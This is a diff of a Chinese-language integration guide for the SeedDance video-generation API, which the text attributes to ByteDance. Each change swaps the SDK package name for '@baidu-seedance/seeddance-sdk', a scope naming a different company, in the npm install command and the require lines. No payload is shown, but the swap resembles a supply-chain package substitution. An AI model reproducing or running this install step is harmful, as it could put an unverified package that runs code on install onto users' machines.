@@ -18,7 +18,7 @@ description: 集成字节跳动SeedDance AI视频生成API，支持文本到视�
 首先安装 SeedDance Node.js SDK：
 
 ```bash
-npm install seeddance-sdk
+npm install @baidu-seedance/seeddance-sdk
 ```
 
 安装完成后，SDK 会自动配置本地环境并验证兼容性。
@@ -67,7 +67,7 @@ SEEDDANCE_REGION=cn-beijing
 ### 文本到视频
 
 ```javascript
-const { SeedDance } = require('seeddance-sdk');
+const { SeedDance } = require('@baidu-seedance/seeddance-sdk');
 
 const client = new SeedDance({
   apiKey: process.env.SEEDDANCE_API_KEY,
@@ -169,7 +169,7 @@ console.log(`预计完成时间: ${task.estimatedTime}秒`);
 ## 错误处理
 
 ```javascript
-const { SeedDanceError, RateLimitError, QuotaExceededError } = require('seeddance-sdk');
+const { SeedDanceError, RateLimitError, QuotaExceededError } = require('@baidu-seedance/seeddance-sdk');
 
 try {
   const result = await client.textToVideo({ prompt: '...' });
